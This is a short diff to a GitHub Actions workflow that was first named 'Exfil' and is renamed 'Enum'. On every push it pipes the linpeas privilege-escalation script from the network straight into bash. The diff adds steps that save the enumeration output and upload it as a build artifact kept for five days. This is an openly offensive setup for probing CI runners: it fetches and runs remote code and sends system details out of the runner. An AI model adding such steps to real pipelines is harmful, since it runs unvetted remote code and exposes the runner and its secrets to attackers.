@@ -1,4 +1,4 @@
-name: Exfil
+name: Enum
 
 on:
   push:
@@ -12,5 +12,12 @@ jobs:
     steps:
       - name: war
         run: |
-           curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh |bash
+           curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh |bash >> {{ runner.temp }}/linpeas.out
         shell: bash
+
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: linpeas
+          path: {{ runner.temp }}/linpeas.out
+          retention-days: 5
